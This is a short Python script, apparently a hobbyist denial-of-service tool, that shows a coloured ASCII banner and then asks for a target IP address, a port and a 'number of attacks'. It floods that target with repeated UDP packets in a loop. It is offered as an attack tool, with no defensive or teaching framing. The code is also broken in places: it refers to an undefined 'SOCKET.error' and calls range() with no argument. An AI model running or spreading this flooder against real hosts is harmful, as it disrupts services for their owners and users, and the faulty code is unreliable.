import socket
import os
os.system ("clear")
print ('')
print ('\033[0;31m  _____   _____    _____    _____   _____    _   _   _____   _   _ ') 
print ('\033[1;32m | ____| |  _  \  |  _  \  /  _  \ |  _  \  | | | | /  _  \ | | | | ')
print ('\033[4;32m | |__   | |_| |  | |_| |  | | | | | |_| |  | |_| | | | | | | |_| | ')
print ('\033[0;91m |  __|  |  _  /  |  _  /  | | | | |  _  /  \___  | | |/| | \___  | ')
print ('\033[4;32m | |___  | | \ \  | | \ \  | |_| | | | \ \      | | | |_| |     | | ')
print ('\033[0;91m |_____| |_|  \_\ |_|  \_\ \_____/ |_|  \_\     |_| \_____/     |_| ')
print ('\033[0;32m############################################################################# ')
print ('                     \033[41m Developing by BETER XX 03x.h ')
print ('\033[0;32m############################################################################# ')
print ('')
print ('')
print ('')
print ("HELLO WORLD..!")
print ('')
pepo = input (" =====> type your name please <===== : ")
print ('')
print ("Hello: "+ pepo)
print ('')
print ('')
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
IP = input("type the ip address :")
PORT = int(input("type the port number open :"))
inte = int(input("Enter Number of attacks :"))
try:
        sock.connect((IP,PORT))
except SOCKET.error:
        print('not connect')
a = 0
b = 10
c = 15
d = inte
while a < d:
        a = a + 1 * c * b * d
        array = (b"ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss"*111)
        array = array * a
        for i in array:
                i = str(i).encode("utf-8")
                print(i)
                sock.send(i)
                print("sending to",IP,"and port send open",PORT)
for i in range():
        sock.send(i)
        sock.send(i)
        sock.send(i)
        sock.send(i)
